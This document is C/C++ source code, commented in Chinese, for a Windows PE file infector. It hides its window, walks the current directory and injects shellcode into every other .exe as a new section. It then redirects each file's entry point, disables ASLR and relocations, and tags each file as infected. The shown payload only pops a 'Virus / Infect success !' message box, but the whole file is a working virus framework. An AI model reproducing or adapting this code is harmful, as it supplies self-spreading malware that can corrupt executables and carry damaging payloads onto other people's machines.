#include "InfectPE.h"
#pragma comment( linker, "/subsystem:windows  /entry:mainCRTStartup" ) // 不显示UI

// shellcode
void __declspec(naked) ShellcodeStart()
{
	__asm {
				pushad
				call    routine

	routine :
				pop     ebp
				sub      ebp, offset routine
				push    0                                // MB_OK
				lea       eax, [ebp + szCaption]
				push    eax                              // lpCaption
				lea	   eax, [ebp + szText]
				push    eax                              // lpText
				push    0                                // hWnd
				mov     eax, 0xAAAAAAAA
				call      eax                              // MessageBoxA

				popad
				push    0xBBBBBBBB                       // OEP
				ret

	szCaption :
					db('V') db('i') db('r') db('u') db('s') db(0)
	szText :
					db('I') db('n') db('f') db('l') db('e') db('c') db('t') db(' ') db('s')
					db('u') db('c') db('c') db('e') db('s') db('s') db(' ') db('!') db(0)
	}
}

void  ShellcodeEnd(void) {}

/*
检查是否为正常PE文件
*/
BOOL IsPeFile(PVOID pHdr)
{
	//判断DOS头标志是否正确
	IMAGE_DOS_HEADER *p1 = (IMAGE_DOS_HEADER*)pHdr;
	if (p1->e_magic != IMAGE_DOS_SIGNATURE){
		return FALSE;
	}
	//判断PE头标志是否正确
	IMAGE_NT_HEADERS*  p2 = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + p1->e_lfanew);
	if (p2->Signature != IMAGE_NT_SIGNATURE){
		return FALSE;
	}
	return TRUE;
}

/*
判断文件是否被感染
*/
BOOL IsInfected(PVOID pHdr)
{
	IMAGE_DOS_HEADER *p = (IMAGE_DOS_HEADER*)pHdr;
	//判断DOS头的保留位是否已被填充为 0xABCD
	if ( p->e_res2[0] == (WORD)INFECTFLAG){
		return TRUE;
	}
	else{
		p->e_res2[0] = (WORD)INFECTFLAG;
		return FALSE;
	}
}

/*
字节对齐
*/
int Align(int size,int n)
{
	if (size%n)	{
		return (size/n + 1)*n;
	}
	return size;
}

/*
感染指定文件
*/
BOOL InfectFile(TCHAR *fpath)
{
	HANDLE hFile = CreateFile(fpath,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

	if ( hFile  == INVALID_HANDLE_VALUE){
		return FALSE;
	}
	HANDLE hMapFile = CreateFileMapping(hFile,NULL,PAGE_READWRITE,NULL,NULL,NULL);
	if (!hMapFile){
		CloseHandle(hFile);
		return FALSE;
	}
	PVOID  pHdr = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,NULL,NULL,NULL);
	if (!pHdr){
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	// 判断是否为正常PE文件
	if (!IsPeFile(pHdr)){
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//判断是否已被感染
	if (IsInfected(pHdr)){
		UnmapViewOfFile(pHdr);
		CloseHandle(hMapFile);
		CloseHandle(hFile);
		return FALSE;
	}

	//PE头指针： 文件头指针+DOS头的e_lfanew位指定的PE头偏移
	IMAGE_NT_HEADERS *pNTHdr = (IMAGE_NT_HEADERS*)((PBYTE)pHdr + ((IMAGE_DOS_HEADER*)pHdr)->e_lfanew);
	//节区头指针： PE头指针+PE头的长度
	IMAGE_SECTION_HEADER *pSecHdr = (IMAGE_SECTION_HEADER*)((PBYTE)pNTHdr + sizeof(IMAGE_NT_HEADERS));
	//两个对齐单位
	DWORD dwFileAlign = pNTHdr->OptionalHeader.FileAlignment;
	DWORD dwSecAlign  = pNTHdr->OptionalHeader.SectionAlignment;

	//最后一个节指针
	IMAGE_SECTION_HEADER *pLastSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections-1];
	//定义 一个新节
	IMAGE_SECTION_HEADER *pNewSec = &pSecHdr[pNTHdr->FileHeader.NumberOfSections];
	//原入口地址（OEP）
	DWORD dwOldOEP = pNTHdr->OptionalHeader.AddressOfEntryPoint + pNTHdr->OptionalHeader.ImageBase;
	//需插入的代码长度
	DWORD dwCodeSize  = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;

	//填充新节的各字段
	memcpy(pNewSec->Name,".new",5);
	pNewSec->Misc.VirtualSize = dwCodeSize;
	pNewSec->VirtualAddress		=	pLastSec->VirtualAddress + Align(pLastSec->Misc.VirtualSize, dwSecAlign);
	pNewSec->SizeOfRawData		=	Align(dwCodeSize,dwFileAlign);
	pNewSec->PointerToRawData	=	pLastSec->PointerToRawData + pLastSec->SizeOfRawData;
	pNewSec->Characteristics	=	IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
	
	//节区数目加 1
	pNTHdr->FileHeader.NumberOfSections++;
	//修正PE镜像大小
	pNTHdr->OptionalHeader.SizeOfImage += Align(pNewSec->Misc.VirtualSize,dwSecAlign);

	//动态获取 MessageBoxA 函数地址
	HMODULE hModule = LoadLibraryA("user32.dll");
	LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");

	//修改 shellcode 中 MessabeBoxA，OEP 地址
	HANDLE hHeap = HeapCreate(NULL,NULL,dwCodeSize);
	LPVOID lpHeap = HeapAlloc(hHeap,HEAP_ZERO_MEMORY,dwCodeSize);
	memcpy(lpHeap,ShellcodeStart,dwCodeSize);

	DWORD dwIncrementor = 0;
	for(;dwIncrementor < dwCodeSize; dwIncrementor++){
		//修改 MessageBoxA 地址
		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA){
			*((LPDWORD)lpHeap +dwIncrementor) = (DWORD)lpAddress;
		}
		//修改 OEP 地址
		if(*((LPDWORD)lpHeap + dwIncrementor) == 0xBBBBBBBB){
			*((LPDWORD)lpHeap +dwIncrementor) = dwOldOEP;
			FreeLibrary(hModule);
			break;
		}
	}

	//关闭目标程序的 ASLR
	pNTHdr->FileHeader.Characteristics |= IMAGE_FILE_RELOCS_STRIPPED;
	pNTHdr->OptionalHeader.DllCharacteristics ^= IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
	pNTHdr->OptionalHeader.DataDirectory[5].VirtualAddress = 0;
	pNTHdr->OptionalHeader.DataDirectory[5].Size = 0;

	//复制shellcode到新节区
	DWORD dwSize = 0;
	SetFilePointer(hFile,NULL,NULL,FILE_END);
	WriteFile(hFile,lpHeap,pNewSec->SizeOfRawData,&dwSize,NULL);
	HeapFree(hHeap,NULL,lpHeap);
	HeapDestroy(hHeap);

	//设置新增节区起始地址为新的入口地址
	pNTHdr->OptionalHeader.AddressOfEntryPoint = pNewSec->VirtualAddress;

	FlushViewOfFile(pHdr,pNTHdr->OptionalHeader.SizeOfHeaders);
	UnmapViewOfFile(pHdr);
	CloseHandle(hMapFile);
	CloseHandle(hFile);

	return TRUE;
}

int main(void)
{
	WIN32_FIND_DATA FileInfo;
	HANDLE hListFile;
	TCHAR szFilePath[MAX_PATH];
	TCHAR szCurrentPath[MAX_PATH];
	TCHAR szCurrentModule[MAX_PATH];

	//获取当前目录
	GetCurrentDirectory(MAX_PATH,szCurrentPath);
	//获取当前模块路径
	GetModuleFileName(NULL,szCurrentModule,MAX_PATH);
	lstrcpy(szFilePath,szCurrentPath);
	lstrcat(szFilePath,L"\\*.exe");

	//遍历当前目录并感染除自身外的所有.exe文件
	hListFile = FindFirstFile(szFilePath,&FileInfo);
	if(hListFile == INVALID_HANDLE_VALUE){
		return 0;
	}
	else{
		do{
			if(!_tcsstr(szCurrentModule,FileInfo.cFileName)){
				//感染目标文件
				if (!InfectFile(FileInfo.cFileName)){
					return 0;
				}
			}
		}while(FindNextFile(hListFile,&FileInfo));
	}
}

